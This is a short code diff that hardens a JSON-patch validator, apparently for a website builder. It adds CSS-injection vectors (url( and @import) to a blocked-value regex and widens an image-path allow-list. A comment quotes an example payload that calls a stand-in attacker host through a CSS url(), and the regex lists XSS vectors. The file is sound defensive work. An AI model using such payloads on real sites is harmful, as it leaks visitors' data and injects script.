@@ -8,7 +8,11 @@ import type { JSONPatch } from '@/lib/schemas/patches'
 import { isAllowedPath, isAllowedAdd, isAllowedRemove } from '@/lib/schemas/patchPaths'
 
 const FORBIDDEN_SEGMENTS = ['__proto__', 'constructor', 'prototype']
-const UNSAFE_VALUE_RE = /(javascript:|data:text\/html|vbscript:|<script|on\w+=)/i
+// P19 Fix-Pass 2 (F3): extend with CSS-injection vectors. A malicious patch
+// could land in a `style.background` field as `red; background-image:
+// url(http://attacker)` and exfiltrate the visitor's IP. Block any value that
+// contains `url(` or `@import` regardless of where it would land.
+const UNSAFE_VALUE_RE = /(javascript:|data:text\/html|vbscript:|<script|on\w+=|\burl\s*\(|@import)/i
 // FIX 3 — ADR-044 §5: image URL allow-list. Any value patched into a path
 // ending in /backgroundImage, /heroImage, or /featuredImage MUST resolve to a
 // host on this list (or the dynamic mediaLibrary host set when present).
@@ -17,7 +21,10 @@ const NAMED_CDN_HOSTS = new Set<string>([
   'cdn.heybradley.app',
   'i.imgur.com',
 ])
-const IMAGE_PATH_RE = /\/(backgroundImage|heroImage|featuredImage)$/
+// P19 Fix-Pass 2 (F3): also gate any path ending in /imageUrl through the
+// image allow-list. Several section components (gallery, hero variant) write
+// to `imageUrl` rather than the legacy *Image keys.
+const IMAGE_PATH_RE = /\/(backgroundImage|heroImage|featuredImage|imageUrl)$/
 const ALLOWED_IMAGE_EXT_RE = /\.(jpe?g|png|webp)(?:$|\?)/i
 const FORBIDDEN_URI_SCHEME_RE = /^(data|javascript|blob|vbscript):/i
 
